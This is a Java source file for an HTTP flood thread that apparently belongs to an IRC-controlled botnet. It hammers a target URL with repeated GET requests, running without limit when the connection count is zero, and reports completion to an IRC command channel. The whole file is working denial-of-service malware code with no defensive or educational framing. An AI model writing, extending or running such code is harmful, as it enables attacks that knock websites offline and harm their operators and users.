package mn.num;

import java.net.URL;
import java.net.HttpURLConnection;

public class HTTPFlood extends Thread {
    private String url;
    private int delay;
    private int connections;
    private int count = 0;
    public static boolean httpFlooding = false;
    public HTTPFlood(String url, int delay, int connections) {
        this.url = url;
        this.delay = delay;
        this.connections = connections;
    }

    @SuppressWarnings("deprecation")
    public void run() {
        while (httpFlooding && (this.count < this.connections || this.connections == 0)) {
            try {
                HttpURLConnection.setFollowRedirects(false);
                HttpURLConnection conn = (HttpURLConnection) (new URL(this.url)).openConnection();
                conn.setRequestMethod("GET");
                System.out.println("response: " + conn.getResponseCode() + " " + conn.getResponseMessage());
                conn = null;
                count++;
            } catch (Exception e) {
            } finally {
                try {
                    Thread.sleep(this.delay);
                } catch (InterruptedException ie) {
                }
            }
        }
        IRC.sendMessage(Config.getChannel(), "Flooding finished!");
        stop();
    }
}